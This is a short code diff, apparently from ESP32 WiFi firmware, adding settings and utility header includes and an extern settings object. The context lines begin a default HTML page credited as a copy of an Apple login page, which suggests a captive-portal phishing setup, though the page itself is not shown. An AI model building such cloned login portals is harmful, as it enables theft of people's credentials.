@@ -18,7 +18,12 @@
 
 #include <LinkedList.h>
 
+#include "core/settingheader.h"
 #include "wifiheader.h"
+#include "core/utilsheader.h"
+
+extern ESP32ATSetting espatsettings;
+
 
 const char default_html[] PROGMEM = R"=====(
     <!-- Original code : https://github.com/ai-dev-official/Apple-Dev-Login-Page- by ai-dev-official -->
